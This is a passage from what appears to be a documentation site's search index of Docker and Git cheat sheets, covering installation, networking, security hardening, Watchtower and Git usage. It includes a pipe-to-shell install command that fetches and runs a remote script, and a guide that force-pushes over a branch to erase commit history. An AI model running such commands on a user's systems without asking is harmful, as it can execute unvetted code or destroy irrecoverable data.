temporarily if it is running. docker rmi removes an image. docker load loads an image from a tar archive as STDIN, including images and tags (as of 0.7). docker save saves an image to a tar archive stream to STDOUT with all parent layers, tags & versions (as of 0.7).", "title": "Lifecycle"}, {"location": "devops/docker/docker-images/#info", "text": "docker history shows history of image. docker tag tags an image to a name (local or registry).", "title": "Info"}, {"location": "devops/docker/docker-images/#cleaning-up", "text": "While you can use the docker rmi command to remove specific images, there's a tool called docker-gc that will safely clean up images that are no longer used by any containers. As of docker 1.13, docker image prune is also available for removing unused images. See Prune .", "title": "Cleaning up"}, {"location": "devops/docker/docker-images/#loadsave-image", "text": "Load an image from file: docker load < my_image.tar.gz Save an existing image: docker save my_image:my_tag | gzip > my_image.tar.gz", "title": "Load/Save image"}, {"location": "devops/docker/docker-images/#importexport-container", "text": "Import a container as an image from file: cat my_container.tar.gz | docker import - my_image:my_tag Export an existing container: docker export my_container | gzip > my_container.tar.gz", "title": "Import/Export container"}, {"location": "devops/docker/docker-images/#difference-between-loading-a-saved-image-and-importing-an-exported-container-as-an-image", "text": "Loading an image using the load command creates a new image including its history. Importing a container as an image using the import command creates a new image excluding the history which results in a smaller image size compared to loading an image.", "title": "Difference between loading a saved image and importing an exported container as an image"}, {"location": "devops/docker/docker-images/#credit", "text": "Thanks to @wsargent for creating this cheat sheet.", "title": "Credit"}, {"location": "devops/docker/docker-install/", "tags": ["docker", "cheat-sheet"], "text": "Docker Installation \u00b6 You can download and install Docker on multiple platforms. The following are the most common ways to install Docker on Linux, Mac, and Windows. You can also install Docker on other platforms if you have the necessary software. Images \u00b6 Linux \u00b6 Run this quick and easy install script provided by Docker: curl -sSL https://get.docker.com/ | sh If you're not willing to run a random shell script, please see the installation instructions for your distribution. If you are a complete Docker newbie, you should follow the series of tutorials now. macOS \u00b6 Download and install Docker Community Edition . if you have Homebrew-Cask, just type brew install --cask docker . Or Download and install Docker Toolbox . Docker For Mac is nice, but it's not quite as finished as the VirtualBox install. See the comparison . NOTE Docker Toolbox is legacy. You should to use Docker Community Edition, See Docker Toolbox . Once you've installed Docker Community Edition, click the docker icon in Launchpad. Then start up a container: docker run hello-world That's it, you have a running Docker container. If you are a complete Docker newbie, you should probably follow the series of tutorials now. Windows 10 \u00b6 Instructions to install Docker Desktop for Windows can be found here Once installed, open powershell as administrator and run: # Display the version of docker installed: docker version # Pull, create, and run 'hello-world': docker run hello-world To continue with this cheat sheet, right click the Docker icon in the system tray, and go to settings. In order to mount volumes, the C:/ drive will need to be enabled in the settings to that information can be passed into the containers (later described in this article). To switch between Windows containers and Linux containers, right click the icon in the system tray and click the button to switch container operating system Doing this will stop the current containers that are running, and make them unaccessible until the container OS is switched back. Additionally, if you have WSL or WSL2 installed on your desktop, you might want to install the Linux Kernel for Windows. Instructions can be found here . This requires the Windows Subsystem for Linux feature. This will allow for containers to be accessed by WSL operating systems, as well as the efficiency gain from running WSL operating systems in docker. It is also preferred to use Windows terminal for this. Windows Server 2016 / 2019 \u00b6 Follow Microsoft's instructions that can be found here If using the latest edge version of 2019, be prepared to only work in powershell, as it is only a servercore image (no desktop interface). When starting this machine, it will login and go straight to a powershell window. It is reccomended to install text editors and other tools using Chocolatey . After installing, these commands will work: # Display the version of docker installed: docker version # Pull, create, and run 'hello-world': docker run hello-world Windows Server 2016 is not able to run Linux images. Windows Server Build 2004 is capable of running both linux and windows containers simultaneously through Hyper-V isolation. When running containers, use the --isolation=hyperv command, which will isolate the container using a seperate kernel instance. Check Version \u00b6 It is very important that you always know the current version of Docker you are currently running on at any point in time. This is very helpful because you get to know what features are compatible with what you have running. This is also important because you know what containers to run from the docker store when you are trying to get template containers. That said let see how to know which version of docker we have running currently. docker version shows which version of docker you have running. Get the server version: $ docker version --format '{{.Server.Version}}' 1.8.0 You can also dump raw JSON data: $ docker version --format '{{json .}}' {\"Client\":{\"Version\":\"1.8.0\",\"ApiVersion\":\"1.20\",\"GitCommit\":\"f5bae0a\",\"GoVersion\":\"go1.4.2\",\"Os\":\"linux\",\"Arch\":\"am\"} Credit \u00b6 Thanks to @wsargent for creating this cheat sheet.", "title": "Docker Installation"}, {"location": "devops/docker/docker-install/#docker-installation", "text": "You can download and install Docker on multiple platforms. The following are the most common ways to install Docker on Linux, Mac, and Windows. You can also install Docker on other platforms if you have the necessary software.", "title": "Docker Installation"}, {"location": "devops/docker/docker-install/#images", "text": "", "title": "Images"}, {"location": "devops/docker/docker-install/#linux", "text": "Run this quick and easy install script provided by Docker: curl -sSL https://get.docker.com/ | sh If you're not willing to run a random shell script, please see the installation instructions for your distribution. If you are a complete Docker newbie, you should follow the series of tutorials now.", "title": "Linux"}, {"location": "devops/docker/docker-install/#macos", "text": "Download and install Docker Community Edition . if you have Homebrew-Cask, just type brew install --cask docker . Or Download and install Docker Toolbox . Docker For Mac is nice, but it's not quite as finished as the VirtualBox install. See the comparison . NOTE Docker Toolbox is legacy. You should to use Docker Community Edition, See Docker Toolbox . Once you've installed Docker Community Edition, click the docker icon in Launchpad. Then start up a container: docker run hello-world That's it, you have a running Docker container. If you are a complete Docker newbie, you should probably follow the series of tutorials now.", "title": "macOS"}, {"location": "devops/docker/docker-install/#windows-10", "text": "Instructions to install Docker Desktop for Windows can be found here Once installed, open powershell as administrator and run: # Display the version of docker installed: docker version # Pull, create, and run 'hello-world': docker run hello-world To continue with this cheat sheet, right click the Docker icon in the system tray, and go to settings. In order to mount volumes, the C:/ drive will need to be enabled in the settings to that information can be passed into the containers (later described in this article). To switch between Windows containers and Linux containers, right click the icon in the system tray and click the button to switch container operating system Doing this will stop the current containers that are running, and make them unaccessible until the container OS is switched back. Additionally, if you have WSL or WSL2 installed on your desktop, you might want to install the Linux Kernel for Windows. Instructions can be found here . This requires the Windows Subsystem for Linux feature. This will allow for containers to be accessed by WSL operating systems, as well as the efficiency gain from running WSL operating systems in docker. It is also preferred to use Windows terminal for this.", "title": "Windows 10"}, {"location": "devops/docker/docker-install/#windows-server-2016-2019", "text": "Follow Microsoft's instructions that can be found here If using the latest edge version of 2019, be prepared to only work in powershell, as it is only a servercore image (no desktop interface). When starting this machine, it will login and go straight to a powershell window. It is reccomended to install text editors and other tools using Chocolatey . After installing, these commands will work: # Display the version of docker installed: docker version # Pull, create, and run 'hello-world': docker run hello-world Windows Server 2016 is not able to run Linux images. Windows Server Build 2004 is capable of running both linux and windows containers simultaneously through Hyper-V isolation. When running containers, use the --isolation=hyperv command, which will isolate the container using a seperate kernel instance.", "title": "Windows Server 2016 / 2019"}, {"location": "devops/docker/docker-install/#check-version", "text": "It is very important that you always know the current version of Docker you are currently running on at any point in time. This is very helpful because you get to know what features are compatible with what you have running. This is also important because you know what containers to run from the docker store when you are trying to get template containers. That said let see how to know which version of docker we have running currently. docker version shows which version of docker you have running. Get the server version: $ docker version --format '{{.Server.Version}}' 1.8.0 You can also dump raw JSON data: $ docker version --format '{{json .}}' {\"Client\":{\"Version\":\"1.8.0\",\"ApiVersion\":\"1.20\",\"GitCommit\":\"f5bae0a\",\"GoVersion\":\"go1.4.2\",\"Os\":\"linux\",\"Arch\":\"am\"}", "title": "Check Version"}, {"location": "devops/docker/docker-install/#credit", "text": "Thanks to @wsargent for creating this cheat sheet.", "title": "Credit"}, {"location": "devops/docker/docker-networks/", "tags": ["docker", "cheat-sheet"], "text": "Docker Networks & Links Cheat Sheet \u00b6 Networks \u00b6 Docker has a networks feature. Docker automatically creates 3 network interfaces when you install it (bridge, host none). A new container is launched into the bridge network by default. To enable communication between multiple containers, you can create a new network and launch containers in it. This enables containers to communicate to each other while being isolated from containers that are not connected to the network. Furthermore, it allows to map container names to their IP addresses. See working with networks for more details. Lifecycle \u00b6 docker network create NAME Create a new network (default type: bridge). docker network rm NAME Remove one or more networks by name or identifier. No containers can be connected to the network when deleting it. Info \u00b6 docker network ls List networks docker network inspect NAME Display detailed information on one or more networks. Connection \u00b6 docker network connect NETWORK CONTAINER Connect a container to a network docker network disconnect NETWORK CONTAINER Disconnect a container from a network You can specify a specific IP address for a container : # create a new bridge network with your subnet and gateway for your ip block docker network create --subnet 203 .0.113.0/24 --gateway 203 .0.113.254 iptastic # run a nginx container with a specific ip in that block $ docker run --rm -it --net iptastic --ip 203 .0.113.2 nginx # curl the ip from any other place (assuming this is a public ip block duh) $ curl 203 .0.113.2 Links \u00b6 Links are how Docker containers talk to each other through TCP/IP ports . Atlassian show worked examples. You can also resolve links by hostname . This has been deprecated to some extent by user-defined networks . NOTE: If you want containers to ONLY communicate with each other through links, start the docker daemon with -icc=false to disable inter process communication. If you have a container with the name CONTAINER (specified by docker run --name CONTAINER ) and in the Dockerfile, it has an exposed port: EXPOSE 1337 Then if we create another container called LINKED like so: docker run -d --link CONTAINER:ALIAS --name LINKED user/wordpress Then the exposed ports and aliases of CONTAINER will show up in LINKED with the following environment variables: $ALIAS_PORT_1337_TCP_PORT $ALIAS_PORT_1337_TCP_ADDR And you can connect to it that way. To delete links, use docker rm --link . Generally, linking between docker services is a subset of \"service discovery\", a big problem if you're planning to use Docker at scale in production. Please read The Docker Ecosystem: Service Discovery and Distributed Configuration Stores for more info. Credit \u00b6 Thanks to @wsargent for creating this cheat sheet.", "title": "Networks & Links Cheat Sheet"}, {"location": "devops/docker/docker-networks/#docker-networks-links-cheat-sheet", "text": "", "title": "Docker Networks &amp; Links Cheat Sheet"}, {"location": "devops/docker/docker-networks/#networks", "text": "Docker has a networks feature. Docker automatically creates 3 network interfaces when you install it (bridge, host none). A new container is launched into the bridge network by default. To enable communication between multiple containers, you can create a new network and launch containers in it. This enables containers to communicate to each other while being isolated from containers that are not connected to the network. Furthermore, it allows to map container names to their IP addresses. See working with networks for more details.", "title": "Networks"}, {"location": "devops/docker/docker-networks/#lifecycle", "text": "docker network create NAME Create a new network (default type: bridge). docker network rm NAME Remove one or more networks by name or identifier. No containers can be connected to the network when deleting it.", "title": "Lifecycle"}, {"location": "devops/docker/docker-networks/#info", "text": "docker network ls List networks docker network inspect NAME Display detailed information on one or more networks.", "title": "Info"}, {"location": "devops/docker/docker-networks/#connection", "text": "docker network connect NETWORK CONTAINER Connect a container to a network docker network disconnect NETWORK CONTAINER Disconnect a container from a network You can specify a specific IP address for a container : # create a new bridge network with your subnet and gateway for your ip block docker network create --subnet 203 .0.113.0/24 --gateway 203 .0.113.254 iptastic # run a nginx container with a specific ip in that block $ docker run --rm -it --net iptastic --ip 203 .0.113.2 nginx # curl the ip from any other place (assuming this is a public ip block duh) $ curl 203 .0.113.2", "title": "Connection"}, {"location": "devops/docker/docker-networks/#links", "text": "Links are how Docker containers talk to each other through TCP/IP ports . Atlassian show worked examples. You can also resolve links by hostname . This has been deprecated to some extent by user-defined networks . NOTE: If you want containers to ONLY communicate with each other through links, start the docker daemon with -icc=false to disable inter process communication. If you have a container with the name CONTAINER (specified by docker run --name CONTAINER ) and in the Dockerfile, it has an exposed port: EXPOSE 1337 Then if we create another container called LINKED like so: docker run -d --link CONTAINER:ALIAS --name LINKED user/wordpress Then the exposed ports and aliases of CONTAINER will show up in LINKED with the following environment variables: $ALIAS_PORT_1337_TCP_PORT $ALIAS_PORT_1337_TCP_ADDR And you can connect to it that way. To delete links, use docker rm --link . Generally, linking between docker services is a subset of \"service discovery\", a big problem if you're planning to use Docker at scale in production. Please read The Docker Ecosystem: Service Discovery and Distributed Configuration Stores for more info.", "title": "Links"}, {"location": "devops/docker/docker-networks/#credit", "text": "Thanks to @wsargent for creating this cheat sheet.", "title": "Credit"}, {"location": "devops/docker/docker-security/", "tags": ["docker", "cheat-sheet"], "text": "Docker Security & Best Practices \u00b6 Security \u00b6 This is where security tips about Docker go. The Docker security page goes into more detail. First things first: Docker runs as root. If you are in the docker group, you effectively have root access . If you expose the docker unix socket to a container, you are giving the container root access to the host . Docker should not be your only defense. You should secure and harden it. For an understanding of what containers leave exposed, you should read Understanding and Hardening Linux Containers by Aaron Grattafiori . This is a complete and comprehensive guide to the issues involved with containers, with a plethora of links and footnotes leading on to yet more useful content. The security tips following are useful if you've already hardened containers in the past, but are not a substitute for understanding. Security Tips \u00b6 For greatest security, you want to run Docker inside a virtual machine. This is straight from the Docker Security Team Lead -- slides / notes . Then, run with AppArmor / seccomp / SELinux / grsec etc to limit the container permissions . See the Docker 1.10 security features for more details. Docker image ids are sensitive information and should not be exposed to the outside world. Treat them like passwords. See the Docker Security Cheat Sheet by Thomas Sj\u00f6gren : some good stuff about container hardening in there. Check out the docker bench security script , download the white papers . Snyk's 10 Docker Image Security Best Practices cheat sheet You should start off by using a kernel with unstable patches for grsecurity / pax compiled in, such as Alpine Linux . If you are using grsecurity in production, you should spring for commercial support for the stable patches , same as you would do for RedHat. It's $200 a month, which is nothing to your devops budget. Since docker 1.11 you can easily limit the number of active processes running inside a container to prevent fork bombs. This requires a linux kernel >= 4.3 with CGROUP_PIDS=y to be in the kernel configuration. docker run --pids-limit=64 Also available since docker 1.11 is the ability to prevent processes from gaining new privileges. This feature have been in the linux kernel since version 3.5. You can read more about it in this blog post. docker run --security-opt = no-new-privileges From the Docker Security Cheat Sheet (it's in PDF which makes it hard to use, so copying below) by Container Solutions : Turn off interprocess communication with: docker -d --icc = false --iptables Set the container to be read-only: docker run --read-only Verify images with a hashsum: docker pull debian@sha256:a25306f3850e1bd44541976aa7b5fd0a29be Set volumes to be read only: docker run -v $( pwd ) /secrets:/secrets:ro debian Define and run a user in your Dockerfile so you don't run as root inside the container: RUN groupadd -r user && useradd -r -g user user USER user User Namespaces \u00b6 There's also work on user namespaces -- it is in 1.10 but is not enabled by default. To enable user namespaces (\"remap the userns\") in Ubuntu 15.10, follow the blog example . Security Videos \u00b6 Using Docker Safely Securing your applications using Docker Container security: Do containers actually contain? Linux Containers: Future or Fantasy? Security Roadmap \u00b6 The Docker roadmap talks about seccomp support . There is an AppArmor policy generator called bane , and they're working on security profiles . Best Practices \u00b6 This is where general Docker best practices and war stories go: The Rabbit Hole of Using Docker in Automated Tests Bridget Kromhout has a useful blog post on running Docker in production at Dramafever. There's also a best practices blog post from Lyst. Building a Development Environment With Docker Discourse in a Docker Container Credit \u00b6 Thanks to @wsargent for creating this cheat sheet.", "title": "Security & Best Practices"}, {"location": "devops/docker/docker-security/#docker-security-best-practices", "text": "", "title": "Docker Security &amp; Best Practices"}, {"location": "devops/docker/docker-security/#security", "text": "This is where security tips about Docker go. The Docker security page goes into more detail. First things first: Docker runs as root. If you are in the docker group, you effectively have root access . If you expose the docker unix socket to a container, you are giving the container root access to the host . Docker should not be your only defense. You should secure and harden it. For an understanding of what containers leave exposed, you should read Understanding and Hardening Linux Containers by Aaron Grattafiori . This is a complete and comprehensive guide to the issues involved with containers, with a plethora of links and footnotes leading on to yet more useful content. The security tips following are useful if you've already hardened containers in the past, but are not a substitute for understanding.", "title": "Security"}, {"location": "devops/docker/docker-security/#security-tips", "text": "For greatest security, you want to run Docker inside a virtual machine. This is straight from the Docker Security Team Lead -- slides / notes . Then, run with AppArmor / seccomp / SELinux / grsec etc to limit the container permissions . See the Docker 1.10 security features for more details. Docker image ids are sensitive information and should not be exposed to the outside world. Treat them like passwords. See the Docker Security Cheat Sheet by Thomas Sj\u00f6gren : some good stuff about container hardening in there. Check out the docker bench security script , download the white papers . Snyk's 10 Docker Image Security Best Practices cheat sheet You should start off by using a kernel with unstable patches for grsecurity / pax compiled in, such as Alpine Linux . If you are using grsecurity in production, you should spring for commercial support for the stable patches , same as you would do for RedHat. It's $200 a month, which is nothing to your devops budget. Since docker 1.11 you can easily limit the number of active processes running inside a container to prevent fork bombs. This requires a linux kernel >= 4.3 with CGROUP_PIDS=y to be in the kernel configuration. docker run --pids-limit=64 Also available since docker 1.11 is the ability to prevent processes from gaining new privileges. This feature have been in the linux kernel since version 3.5. You can read more about it in this blog post. docker run --security-opt = no-new-privileges From the Docker Security Cheat Sheet (it's in PDF which makes it hard to use, so copying below) by Container Solutions : Turn off interprocess communication with: docker -d --icc = false --iptables Set the container to be read-only: docker run --read-only Verify images with a hashsum: docker pull debian@sha256:a25306f3850e1bd44541976aa7b5fd0a29be Set volumes to be read only: docker run -v $( pwd ) /secrets:/secrets:ro debian Define and run a user in your Dockerfile so you don't run as root inside the container: RUN groupadd -r user && useradd -r -g user user USER user", "title": "Security Tips"}, {"location": "devops/docker/docker-security/#user-namespaces", "text": "There's also work on user namespaces -- it is in 1.10 but is not enabled by default. To enable user namespaces (\"remap the userns\") in Ubuntu 15.10, follow the blog example .", "title": "User Namespaces"}, {"location": "devops/docker/docker-security/#security-videos", "text": "Using Docker Safely Securing your applications using Docker Container security: Do containers actually contain? Linux Containers: Future or Fantasy?", "title": "Security Videos"}, {"location": "devops/docker/docker-security/#security-roadmap", "text": "The Docker roadmap talks about seccomp support . There is an AppArmor policy generator called bane , and they're working on security profiles .", "title": "Security Roadmap"}, {"location": "devops/docker/docker-security/#best-practices", "text": "This is where general Docker best practices and war stories go: The Rabbit Hole of Using Docker in Automated Tests Bridget Kromhout has a useful blog post on running Docker in production at Dramafever. There's also a best practices blog post from Lyst. Building a Development Environment With Docker Discourse in a Docker Container", "title": "Best Practices"}, {"location": "devops/docker/docker-security/#credit", "text": "Thanks to @wsargent for creating this cheat sheet.", "title": "Credit"}, {"location": "devops/docker/watchtower/", "tags": ["docker", "container", "watchtower"], "text": "Watchtower \u00b6 Quick Start \u00b6 With watchtower you can update the running version of your containerized app simply by pushing a new image to the Docker Hub or your own image registry. Watchtower will pull down your new image, gracefully shut down your existing container and restart it with the same options that were used when it was deployed initially. Run the watchtower container with the following command: docker run docker-compose.yml $ docker run -d \\ --name watchtower \\ -v /var/run/docker.sock:/var/run/docker.sock \\ containrrr/watchtower version : \"3\" services : watchtower : image : containrrr/watchtower volumes : - /var/run/docker.sock:/var/run/docker.sock What is Watchtower? \u00b6 Watchtower is an application that will monitor your running Docker containers and watch for changes to the images that those containers were originally started from. If watchtower detects that an image has changed, it will automatically restart the container using the new image. With watchtower you can update the running version of your containerized app simply by pushing a new image to the Docker Hub or your own image registry. Watchtower will pull down your new image, gracefully shut down your existing container and restart it with the same options that were used when it was deployed initially. Full documanation can be found at Watchtower Documentation . Github repo can be found at Watchtower Github Repository . Run Ones \u00b6 You can run Watchtower run once to force an update of a containers by running the following command: docker run --rm -v /var/run/docker.sock:/var/run/docker.sock containrrr/watchtower --run-once Docker Compose Example \u00b6 Blow is and example of a docker-compose.yml file that uses watchtower to automatically update your running containers at 3:30 AM every day, sending notifications to Telegram with shoutrrr version : '3' services : watchtower : image : containrrr/watchtower container_name : watchtower hostname : port-watchtower restart : always network_mode : bridge volumes : - /var/run/docker.sock:/var/run/docker.sock - /etc/localtime:/etc/localtime environment : - WATCHTOWER_NOTIFICATIONS=shoutrrr - WATCHTOWER_NOTIFICATION_URL=telegram://<Bot-api-token>@telegram/?channels=<channel-id> command : --schedule '0 30 3 * * *' --cleanup", "title": "Watchtower"}, {"location": "devops/docker/watchtower/#watchtower", "text": "", "title": "Watchtower"}, {"location": "devops/docker/watchtower/#quick-start", "text": "With watchtower you can update the running version of your containerized app simply by pushing a new image to the Docker Hub or your own image registry. Watchtower will pull down your new image, gracefully shut down your existing container and restart it with the same options that were used when it was deployed initially. Run the watchtower container with the following command: docker run docker-compose.yml $ docker run -d \\ --name watchtower \\ -v /var/run/docker.sock:/var/run/docker.sock \\ containrrr/watchtower version : \"3\" services : watchtower : image : containrrr/watchtower volumes : - /var/run/docker.sock:/var/run/docker.sock", "title": "Quick Start"}, {"location": "devops/docker/watchtower/#what-is-watchtower", "text": "Watchtower is an application that will monitor your running Docker containers and watch for changes to the images that those containers were originally started from. If watchtower detects that an image has changed, it will automatically restart the container using the new image. With watchtower you can update the running version of your containerized app simply by pushing a new image to the Docker Hub or your own image registry. Watchtower will pull down your new image, gracefully shut down your existing container and restart it with the same options that were used when it was deployed initially. Full documanation can be found at Watchtower Documentation . Github repo can be found at Watchtower Github Repository .", "title": "What is Watchtower?"}, {"location": "devops/docker/watchtower/#run-ones", "text": "You can run Watchtower run once to force an update of a containers by running the following command: docker run --rm -v /var/run/docker.sock:/var/run/docker.sock containrrr/watchtower --run-once", "title": "Run Ones"}, {"location": "devops/docker/watchtower/#docker-compose-example", "text": "Blow is and example of a docker-compose.yml file that uses watchtower to automatically update your running containers at 3:30 AM every day, sending notifications to Telegram with shoutrrr version : '3' services : watchtower : image : containrrr/watchtower container_name : watchtower hostname : port-watchtower restart : always network_mode : bridge volumes : - /var/run/docker.sock:/var/run/docker.sock - /etc/localtime:/etc/localtime environment : - WATCHTOWER_NOTIFICATIONS=shoutrrr - WATCHTOWER_NOTIFICATION_URL=telegram://<Bot-api-token>@telegram/?channels=<channel-id> command : --schedule '0 30 3 * * *' --cleanup", "title": "Docker Compose Example"}, {"location": "devops/git/delete-commit-history/", "tags": ["github", "history", "security"], "text": "Removing Sensitive Data from a Repository History \u00b6 As humans, we sometimes make mistakes. One of them is committing sensitive data in our Git repository. If you commit sensitive data, such as a password, SSH key, API tokens, license keys and so on into a Git repository, you can remove it from the history. You can follow the official GitHub instructions to remove sensitive data from the history. It's probably the best and the right way to do it. Below is a fast way to remove sensitive data from a repository's history but with a few caveats like loosing all the history of the repository. Delete Commit History in Github Repository \u00b6 Danger This will remove your old commit history completely, You can\u2019t recover it again! Create Orphan Branch \u2013 Create a new orphan branch in git repository. The newly created branch will not show in \u2018git branch\u2019 command. git checkout --orphan temp_branch Add Files to Branch \u2013 Now add all files to newly created branch and commit them using following commands. git add -A git commit -am \"first commit\" Delete master/main Branch. Adjust the command according your git repository git branch -D main Rename Current Branch \u2013 After deleting the master/main branch, let\u2019s rename newly created branch name to master/main . git branch -m main Push Changes \u2013 You have completed the changes to your local git repository. Finally, push your changes to the remote master/main (Github) repository forcefully. git push -f origin main", "title": "Removing Sensitive Data"}, {"location": "devops/git/delete-commit-history/#removing-sensitive-data-from-a-repository-history", "text": "As humans, we sometimes make mistakes. One of them is committing sensitive data in our Git repository. If you commit sensitive data, such as a password, SSH key, API tokens, license keys and so on into a Git repository, you can remove it from the history. You can follow the official GitHub instructions to remove sensitive data from the history. It's probably the best and the right way to do it. Below is a fast way to remove sensitive data from a repository's history but with a few caveats like loosing all the history of the repository.", "title": "Removing Sensitive Data from a Repository History"}, {"location": "devops/git/delete-commit-history/#delete-commit-history-in-github-repository", "text": "Danger This will remove your old commit history completely, You can\u2019t recover it again! Create Orphan Branch \u2013 Create a new orphan branch in git repository. The newly created branch will not show in \u2018git branch\u2019 command. git checkout --orphan temp_branch Add Files to Branch \u2013 Now add all files to newly created branch and commit them using following commands. git add -A git commit -am \"first commit\" Delete master/main Branch. Adjust the command according your git repository git branch -D main Rename Current Branch \u2013 After deleting the master/main branch, let\u2019s rename newly created branch name to master/main . git branch -m main Push Changes \u2013 You have completed the changes to your local git repository. Finally, push your changes to the remote master/main (Github) repository forcefully. git push -f origin main", "title": "Delete Commit History in Github Repository"}, {"location": "devops/git/git-cli-cheat-sheet/", "tags": ["github", "git", "cheat-sheet"], "text": "Git Cli Cheat Sheet \u00b6 Git is a free and open source distributed version control system designed to quickly and efficiently manage everything from small to very large projects. Create Repositories \u00b6 A new repository can either be created locally, or an existing repository can be cloned. When a repository was initialized locally, you have to push it to GitHub afterwards. The git init command turns an existing directory into a new Git repository inside the folder you are running this command. After using the git init command, link the local repository to an empty GitHub repository using the following command: git init Specifies the remote repository for your local repository. The url points to a repository on GitHub. git remote add origin [ url ] Clone (download) a repository that already exists on GitHub, including all of the files, branches, and commits git clone [ url ] Git Configuration \u00b6 Configure user information for all local repositories Sets the name you want attached to your commit transactions git config --global user.name \"[name]\" Sets the email you want attached to your commit transactions git config --global user.email \"[email address]\" Enables helpful colorization of command line output git config --global color.ui auto Synchronize Changes \u00b6 Synchronize your local repository with the remote repository on GitHub.com Downloads all history from the remote tracking branches git fetch Combines remote tracking branches into current local branch git merge Uploads all local branch commits to GitHub git push Updates your current local working branch with all new commits from the corresponding remote branch on GitHub. git pull is a combination of git fetch and git merge git pull Redo Commits \u00b6 Erase mistakes and craft replacement history Undoes all commits after [commit], preserving changes locally git reset [ commit ] Discards all history and changes back to the specified commit git reset --hard [ commit ] Branches \u00b6 Branches are an important part of working with Git. Any commits you make will be made on the branch you\u2019re currently \u201cchecked out\u201d to. Use git status to see which branch that is. Creates a new branch git branch [ branch-name ] Switches to the specified branch and updates the working directory git switch -c [ branch-name ] Combines the specified branch\u2019s history into the current branch. This is usually done in pull requests, but is an important Git operation. git merge [ branch ] Deletes the specified branch git branch -d [ branch-name ] Make Changes \u00b6 Browse and inspect the evolution of project files Lists version history for the current branch git log Lists version history for a file, beyond renames (works only for a single file) git log --follow [ file ] Shows content differences between two branches git diff [ first-branch ] ... [ second-branch ] Outputs metadata and content changes of the specified commit git show [ commit ] Snapshots the file in preparation for versioning git add [ file ] Records file snapshots permanently in version history git commit -m \"[descriptive message]\" The .gitignore file \u00b6 Sometimes it may be a good idea to exclude files from being tracked with Git. This is typically done in a special file named .gitignore. You can find helpful templates for .gitignore files at github.com/github/gitignore . Untrack Files Already Added to git Repository Based on .gitignore \u00b6 Commit all your changes. Before proceeding, make sure all your changes are committed, including your .gitignore file. Remove everything from the repository. To clear your repo, use: git rm -r --cached . Re add everything. git add . Commit. git commit -m \".gitignore fix\" Use Gist as Repository \u00b6 It's probably easiest if you just start by cloning the gist, so that origin (a \"remote\" that refers to the original repository) is set up for you. Then you can just do git push origin master . For example: git clone git@gist.github.com:869085.git mygist cd mygist Add you changes to the repository. git add . git commit -m \"Better comments\" git push origin master However, if you don't want to redo your changes, you can do: cd mygist git remote add origin git@gist.github.com:869085.git git fetch origin # Push your changes, also setting the upstream for master: git push -u origin master Strictly speaking, the git fetch origin and -u argument to git push origin master are optional, but they will helpfully associate the upstream branch master in origin with your local branch master .", "title": "Git Cli Cheat Sheet"}, {"location": "devops/git/git-cli-cheat-sheet/#git-cli-cheat-sheet", "text": "Git is a free and open source distributed version control system designed to quickly and efficiently manage everything from small to very large projects.", "title": "Git Cli Cheat Sheet"}, {"location": "devops/git/git-cli-cheat-sheet/#create-repositories", "text": "A new repository can either be created locally, or an existing repository can be cloned. When a repository was initialized locally, you have to push it to GitHub afterwards. The git init command turns an existing directory into a new Git repository inside the folder you are running this command. After using the git init command, link the local repository to an empty GitHub repository using the following command: git init Specifies the remote repository for your local repository. The url points to a repository on GitHub. git remote add origin [ url ] Clone (download) a repository that already exists on GitHub, including all of the files, branches, and commits git clone [ url ]", "title": "Create Repositories"}, {"location": "devops/git/git-cli-cheat-sheet/#git-configuration", "text": "Configure user information for all local repositories Sets the name you want attached to your commit transactions git config --global user.name \"[name]\" Sets the email you want attached to your commit transactions git config --global user.email \"[email address]\" Enables helpful colorization of command line output git config --global color.ui auto", "title": "Git Configuration"}, {"location": "devops/git/git-cli-cheat-sheet/#synchronize-changes", "text": "Synchronize your local repository with the remote repository on GitHub.com Downloads all history from the remote tracking branches git fetch Combines remote tracking branches into current local branch git merge Uploads all local branch commits to GitHub git push Updates your current local working branch with all new commits from the corresponding remote branch on GitHub. git pull is a combination of git fetch and git merge git pull", "title": "Synchronize Changes"}, {"location": "devops/git/git-cli-cheat-sheet/#redo-commits", "text": "Erase mistakes and craft replacement history Undoes all commits after [commit], preserving changes locally git reset [ commit ] Discards all history and changes back to the specified commit git reset --hard [ commit ]", "title": "Redo Commits"}, {"location": "devops/git/git-cli-cheat-sheet/#branches", "text": "Branches are an important part of working with Git. Any commits you make will be made on the branch you\u2019re currently \u201cchecked out\u201d to. Use git status to see which branch that is. Creates a new branch git branch [ branch-name ] Switches to the specified branch and updates the working directory git switch -c [ branch-name ] Combines the specified branch\u2019s history into the current branch. This is usually done in pull requests, but is an important Git operation. git merge [ branch ] Deletes the specified branch git branch -d [ branch-name ]", "title": "Branches"}, {"location": "devops/git/git-cli-cheat-sheet/#make-changes", "text": "Browse and inspect the evolution of project files Lists version history for the current branch git log Lists version history for a file, beyond renames (works only for a single file) git log --follow [ file ] Shows content differences between two branches git diff [ first-branch ] ... [ second-branch ] Outputs metadata and content changes of the specified commit git show [ commit ] Snapshots the file in preparation for versioning git add [ file ] Records file snapshots permanently in version history git commit -m \"[descriptive message]\"", "title": "Make Changes"}, {"location": "devops/git/git-cli-cheat-sheet/#the-gitignore-file", "text": "Sometimes it may be a good idea to exclude files from being tracked with Git. This is typically done in a special file named .gitignore. You can find helpful templates for .gitignore files at github.com/github/gitignore .", "title": "The .gitignore file"}, {"location": "devops/git/git-cli-cheat-sheet/#untrack-files-already-added-to-git-repository-based-on-gitignore", "text": "Commit all your changes. Before proceeding, make sure all your changes are committed, including your .gitignore file. Remove everything from the repository. To clear your repo, use: git rm -r --cached . Re add everything. git add . Commit. git commit -m \".gitignore fix\"", "title": "Untrack Files Already Added to git Repository Based on .gitignore"}, {"location": "devops/git/git-cli-cheat-sheet/#use-gist-as-repository", "text": "It's probably easiest if you just start by cloning the gist, so that origin (a \"remote\" that refers to the original repository) is set up for you. Then you can just do git push origin master . For example: git clone git@gist.github.com:869085.git mygist cd mygist Add you changes to the repository. git add . git commit -m \"Better comments\" git push origin master However, if you don't want to redo your changes, you can do: cd mygist git remote add origin git@gist.github.com:869085.git git fetch origin # Push your changes, also setting the upstream for master: git push -u origin master Strictly speaking, the git fetch origin and -u argument to git push origin master are optional, but they will helpfully associate the upstream branch master in origin with your local branch master .", "title": "Use Gist as Repository"}, {"location": "devops/git/git-submodules/", "tags": ["github", "cheat-sheet", "submodules"], "text": "Git Submodules Cheat Sheet \u00b6 What is a Submodule? \u00b6 Git submodules allow you to keep a git repository as a subdirectory of another git repository. Git submodules are simply a reference to another repository at a particular snapshot in time. Git submodules enable a Git repository to incorporate and track version history of external code. Add a Submodule \u00b6 You need to know the remote git repository url and where you want to place that it in your repository. for example: git 